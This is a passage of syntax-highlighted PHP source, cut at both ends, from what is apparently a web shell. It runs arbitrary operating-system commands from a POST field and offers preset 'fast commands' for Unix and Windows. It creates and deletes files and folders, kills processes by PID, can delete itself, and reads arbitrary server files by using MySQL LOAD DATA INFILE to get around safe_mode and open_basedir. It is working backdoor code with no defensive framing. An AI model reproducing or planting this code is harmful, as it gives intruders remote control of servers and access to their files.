<span class="s2">Remove: &amp;lt;u&amp;gt;&quot;</span><span class="p">;</span>
<span class="nv">$path</span><span class="o">=</span><span class="k">__FILE__</span><span class="p">;</span>
<span class="k">print</span> <span class="nv">$path</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot; &amp;lt;/u&amp;gt;?&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">die</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$p</span><span class="o">==</span><span class="s2">&quot;yes&quot;</span><span class="p">){</span>
<span class="nv">$path</span><span class="o">=</span><span class="k">__FILE__</span><span class="p">;</span>
<span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
<span class="nv">$path</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$path</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$path</span><span class="p">)){</span><span class="nv">$hmm</span><span class="o">=</span><span class="s2">&quot;NOT DELETED!!!&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;font color=red&amp;gt;FILE </span><span class="si">$path</span><span class="s2"> NOT DELETED&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span><span class="nv">$hmm</span><span class="o">=</span><span class="s2">&quot;DELETED&quot;</span><span class="p">;}</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;script&amp;gt;alert(&#39;</span><span class="si">$path</span><span class="s2"> </span><span class="si">$hmm</span><span class="s2">&#39;);&amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>

<span class="p">}</span>



<span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span>
<span class="k">function</span> <span class="nf">fastcmd</span><span class="p">(){</span>
<span class="k">global</span> <span class="nv">$fast_commands</span><span class="p">;</span>
<span class="nv">$c_f</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$fast_commands</span><span class="p">);</span>
<span class="nv">$c_f</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$c_f</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;form method=post&amp;gt;</span>
<span class="s2">Total commands: </span><span class="si">$c_f</span><span class="s2">&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;select name=sh3&amp;gt;&quot;</span><span class="p">;</span>

<span class="nv">$c</span><span class="o">=</span><span class="nb">substr_count</span><span class="p">(</span><span class="nv">$fast_commands</span><span class="p">,</span><span class="s2">&quot; (nst) &quot;</span><span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="nv">$c</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
       <span class="nv">$expl2</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$fast_commands</span><span class="p">);</span>
        <span class="nv">$expl</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; (nst) &quot;</span><span class="p">,</span><span class="nv">$expl2</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$expl</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">!=</span><span class="s2">&quot;&quot;</span><span class="p">){</span>
        <span class="k">print</span> <span class="s2">&quot;&amp;lt;option value=&#39;&quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$expl</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;</span><span class="si">$expl[0]</span><span class="s2">&amp;lt;/option&amp;gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
   <span class="p">}</span>
<span class="p">}</span>

<span class="k">print</span> <span class="s2">&quot;&amp;lt;/select&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit value=Exec&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span><span class="c1">#end of os unix</span>


<span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;win&quot;</span><span class="p">){</span>
<span class="k">function</span> <span class="nf">fastcmd</span><span class="p">(){</span>
<span class="k">global</span> <span class="nv">$fast_commands_win</span><span class="p">;</span>
<span class="nv">$c_f</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$fast_commands_win</span><span class="p">);</span>
<span class="nv">$c_f</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$c_f</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;form method=post&amp;gt;</span>
<span class="s2">Total commands: </span><span class="si">$c_f</span><span class="s2">&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;select name=sh3&amp;gt;&quot;</span><span class="p">;</span>

<span class="nv">$c</span><span class="o">=</span><span class="nb">substr_count</span><span class="p">(</span><span class="nv">$fast_commands_win</span><span class="p">,</span><span class="s2">&quot; (nst) &quot;</span><span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="nv">$c</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
       <span class="nv">$expl2</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$fast_commands_win</span><span class="p">);</span>
        <span class="nv">$expl</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; (nst) &quot;</span><span class="p">,</span><span class="nv">$expl2</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$expl</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">!=</span><span class="s2">&quot;&quot;</span><span class="p">){</span>
        <span class="k">print</span> <span class="s2">&quot;&amp;lt;option value=&#39;&quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$expl</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;</span><span class="si">$expl[0]</span><span class="s2">&amp;lt;/option&amp;gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
   <span class="p">}</span>
<span class="p">}</span>

<span class="k">print</span> <span class="s2">&quot;&amp;lt;/select&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit value=Exec&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span><span class="c1">#end of os win</span>


<span class="k">echo</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sh311&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;1&quot;</span><span class="p">){</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;cmd&amp;lt;br&amp;gt;pwd:</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">getcwd</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">Fast cmd:&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="nx">fastcmd</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;win&quot;</span><span class="p">){</span><span class="nv">$d</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$d</span><span class="p">);}</span>
<span class="k">print</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">javascript:cwd(&#39;</span><span class="si">$d</span><span class="s2"> &#39;)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Insert pwd&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;form name=sh311Form method=post&amp;gt;&amp;lt;input name=sh3 size=110&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sh3&#39;</span><span class="p">]){</span>
<span class="nv">$sh3</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sh3&#39;</span><span class="p">];</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="sb">`$sh3`</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sh311&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;2&quot;</span><span class="p">){</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;cmd&amp;lt;br&amp;gt;</span>
<span class="s2">pwd:</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">getcwd</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">Fast cmd:&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="nx">fastcmd</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;win&quot;</span><span class="p">){</span><span class="nv">$d</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$d</span><span class="p">);}</span>
<span class="k">print</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">javascript:cwd(&#39;</span><span class="si">$d</span><span class="s2"> &#39;)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Insert pwd&amp;lt;/a&amp;gt;</span>
<span class="s2">&amp;lt;form name=sh311Form method=post&amp;gt;&amp;lt;input name=sh3 size=110&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sh3&#39;</span><span class="p">]){</span>
<span class="nv">$sh3</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sh3&#39;</span><span class="p">];</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span> <span class="k">print</span> <span class="sb">`$sh3`</span><span class="p">;</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;}</span>

<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delfl&#39;</span><span class="p">]){</span>
<span class="o">@</span><span class="nv">$delfolder</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delfolder&#39;</span><span class="p">];</span>
<span class="k">echo</span> <span class="s2">&quot;DELETE FOLDER: &amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delfolder&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">(All files must be writable)&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?deldir=1&amp;dir=&quot;</span><span class="o">.@</span><span class="nv">$delfolder</span><span class="o">.</span><span class="s2">&quot;&amp;rback=&quot;</span><span class="o">.@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;rback&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;Yes&amp;lt;/a&amp;gt; || &amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&#39;&amp;gt;No&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>


<span class="nv">$mkdir</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;mkdir&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$mkdir</span><span class="p">){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Create Folder in </span><span class="si">$d</span><span class="s2"> :&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;form method=post&amp;gt;</span>
<span class="s2">New folder name:&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input name=dir_n size=30&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dir_n&#39;</span><span class="p">]){</span>
<span class="nb">mkdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dir_n&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Cannot create directory &#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dir_n&#39;</span><span class="p">]);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;Directory created success!&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">print</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">die</span><span class="p">;</span>
<span class="p">}</span>


<span class="nv">$mkfile</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;mkfile&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Create file in </span><span class="si">$d</span><span class="s2"> :&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;form method=post&amp;gt;</span>
<span class="s2">File name:&amp;lt;br&amp;gt;</span>
<span class="s2">(example: hello.txt , hello.php)&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input name=file_n size=30&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file_n&#39;</span><span class="p">]){</span>
<span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file_n&#39;</span><span class="p">],</span><span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Cannot create file &#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file_n&#39;</span><span class="p">]);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;File created success!&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">print</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">die</span><span class="p">;</span>
<span class="p">}</span>


<span class="nv">$ps_table</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ps_table&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$ps_table</span><span class="p">){</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;kill_p&#39;</span><span class="p">]){</span>
<span class="nb">exec</span><span class="p">(</span><span class="s2">&quot;kill -9 &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;kill_p&#39;</span><span class="p">]);</span>
<span class="p">}</span>

<span class="nv">$str</span><span class="o">=</span><span class="sb">`ps aux`</span><span class="p">;</span>

<span class="c1"># You can put here preg_match_all for other distrib/os</span>
<span class="nb">preg_match_all</span><span class="p">(</span><span class="s2">&quot;/(?:.*?)([0-9]{1,7})(.*?)\s\s\s[0-9]:[0-9][0-9]\s(.*)/i&quot;</span><span class="p">,</span><span class="nv">$str</span><span class="p">,</span><span class="nv">$matches</span><span class="p">);</span>


<span class="k">print</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;PS Table :: Fast kill program&amp;lt;br&amp;gt;</span>
<span class="s2">(p.s: Tested on Linux slackware 10.0)&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;br&amp;gt;&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;table border=1&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="nv">$expl</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nv">$i</span><span class="p">]);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;</span><span class="si">$expl[0]</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;PID: &quot;</span><span class="o">.</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; :: &quot;</span><span class="o">.</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;form method=post&amp;gt;&amp;lt;td&amp;gt;&amp;lt;font color=red&amp;gt;Kill: &amp;lt;input type=submit name=kill_p value=&quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="nv">$i</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span><span class="c1">#end of for</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="nb">unset</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
<span class="k">print</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">die</span><span class="p">;</span>
<span class="p">}</span><span class="c1">#end of ps table</span>


<span class="nv">$read_file_safe_mode</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;read_file_safe_mode&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$read_file_safe_mode</span><span class="p">){</span>

<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;l&#39;</span><span class="p">])){</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;l&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;root&quot;</span><span class="p">;}</span>

<span class="k">print</span> <span class="s2">&quot;&amp;lt;br&amp;gt;</span>
<span class="s2">Read file content using MySQL - when &amp;lt;b&amp;gt;safe_mode&amp;lt;/b&amp;gt;, &amp;lt;b&amp;gt;open_basedir&amp;lt;/b&amp;gt; is &amp;lt;font color=green&amp;gt;ON&amp;lt;/font&amp;gt;&amp;lt;Br&amp;gt;</span>
<span class="s2">&amp;lt;form method=post&amp;gt;</span>
<span class="s2">&amp;lt;table&amp;gt;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Addr:&amp;lt;/td&amp;gt;&amp;lt;Td&amp;gt; &amp;lt;input name=serv_ip value=&#39;127.0.0.1&#39;&amp;gt;&amp;lt;input name=port value=&#39;3306&#39; size=6&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Login:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=l value=&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;l&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Passw:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input name=p value=&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span>
<span class="s2">(example: /etc/hosts)&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input name=read_file size=45&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit value=&#39;Show content&#39;&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;</span>
<span class="s2">&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;read_file&#39;</span><span class="p">]){</span>
<span class="nv">$read_file</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;read_file&#39;</span><span class="p">];</span>
<span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;serv_ip&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">],</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;l&#39;</span><span class="p">],</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="nb">mysql_create_db</span><span class="p">(</span><span class="s2">&quot;tmp_bd_file&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="nb">mysql_select_db</span><span class="p">(</span><span class="s2">&quot;tmp_bd_file&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="nb">mysql_query</span><span class="p">(</span><span class="s1">&#39;CREATE TABLE `tmp_file` ( `file` LONGBLOB NOT NULL );&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;LOAD DATA INFILE </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$read_file</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> INTO TABLE tmp_file&quot;</span><span class="p">);</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM tmp_file&quot;</span><span class="p">;</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;b&amp;gt;File content&amp;lt;/b&amp;gt;:&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="nv">$name</span><span class="o">=</span><span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);}</span>
<span class="k">while</span><span class="p">(</span><span class="nv">$line</span><span class="o">=</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">)){</span>
